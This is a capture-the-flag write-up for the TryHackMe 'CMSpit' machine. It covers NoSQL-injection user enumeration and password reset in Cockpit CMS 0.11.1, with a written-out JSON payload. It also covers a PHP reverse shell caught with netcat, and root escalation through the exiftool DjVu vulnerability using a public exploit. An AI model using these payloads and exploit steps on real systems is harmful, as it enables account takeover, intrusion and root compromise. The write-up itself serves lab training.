### CMSpit
This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.

## 🖥️ Initial Recon:
Beginning with a basic nmap scan:
```bash
nmap -A 10.10.116.219
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 11:10 +06
Nmap scan report for 10.10.116.219
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Ports 22 and 80 are open; focusing on port 80.

## 🌐 Web Enum:
Visiting port 80 provides us with a login page.

***● What is the name of the Content Management System (CMS) installed on the server?***

The CMS name is displayed on the login page.\
Ans: cockpit

***● What is the version of the Content Management System (CMS) installed on the server?***

The version number can be found in the login page's source code. Right-click the page, open the source code, and examine it carefully.\
Ans: 0.11.1

***● What is the path that allow user enumeration?***

This endpoint in Cockpit CMS 0.11.1 is vulnerable to NoSQL Injection (CVE-2020-35846), allowing attackers to enumerate valid usernames.\
Ans: /auth/check

**Exploitation:**\
There’s both an automated and a manual exploit; let’s try the automated one first.
```bash
searchsploit cockpit 0.11.1
```
you'll find the exploit, now it's time to download and execute.
```bash
searchsploit -m 50185
```
```bash
python3 50185.py -u http://IP/
```
This vulnerability allows extracting password reset tokens, retrieving full user details (including email, hashed password, and user ID), and resetting any user's password without authentication.\
To manually test for vulnerabilities, use Burp Suite to intercept login attempts with arbitrary credentials, then craft an exploit payload based on resources like Exploit-DB.
```bash
{"auth":{"user":{"$func":"var_dump"},"password":"admin"},"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"}
```
This is the one I used

***● What is the path that allows you to change user account passwords?***

Review the exploit file to identify the path for changing the password.\
Ans: /auth/requestreset

***● Compromise the Content Management System (CMS). What is Skidy's email.***

Use the exploit and compromise user skidy\
Ans: skidy@tryhackme.fakemail

***● What is the web flag?***

Compromise the admin account using the exploit, then log in and navigate to Assets. Create a folder and upload a PHP shell from `pentestmonkey`, editing the IP and port settings accordingly.\
Start a netcat listener on your machine using the port specified in the shell. Then, open the uploaded shell and tap the direct link to the asset to establish a connection.\
Go to `/var/www/html/cockpit` and open the web flag file.\
Ans: thm{REDACTED}

***● Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?***

Navigate to the home directory, open the `dbshell` file, and retrieve the flag.\
Ans: thm{REDACTED}

***● What is the user.txt flag?***

Access the `stux` user's credentials in the `dbshell` file, then log in via SSH to read the user flag.\
Ans: thm{REDACTED}

***● What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000***

Run `sudo -l` on stux user and you will find the binary assigned is `/usr/local/bin/exiftool`\
Little bit of researching on it and found the binary `/usr/local/bin/exiftool` is vulnerable to arbitrary code execution due to improper handling of DjVu image files.\
Ans: CVE-2021-22204

***● What is the utility used to create the PoC file?***

An exploit for this vulnerability is available at https://github.com/UNICORDev/exploit-CVE-2021-22204.\
The `exploit-CVE-2021-22204.py` script defines a `dependencies` function containing the following variable.
```bash
deps = {'bzz':"sudo apt install djvulibre-bin",'djvumake':"sudo apt install djvulibre-bin",'exiftool':"sudo apt install exiftool"}
```
The utility's name is in these dependencies.\
Ans: djvumake

***● Escalate your privileges. What is the flag in root.txt?***

A malicious JPG file can be created using the exploit at https://github.com/UNICORDev/exploit-CVE-2021-22204 and then transferred to a target to perform the exploit.\
First, install the dependencies on your machine:
```bash
sudo apt install djvulibre-bin exiftool
```
Then, execute the exploit to generate the malicious .jpg file.
```bash
python3 exploit-CVE-2021-22204.py -c "/bin/bash"
```
Transfer the file to the target by starting a Python server in the malicious image directory and use `wget` on the target machine to download the image.\
Run exiftool on the image to obtain a root shell, then navigate to the root directory and read the root flag.\
Ans: thm{REDACTED}
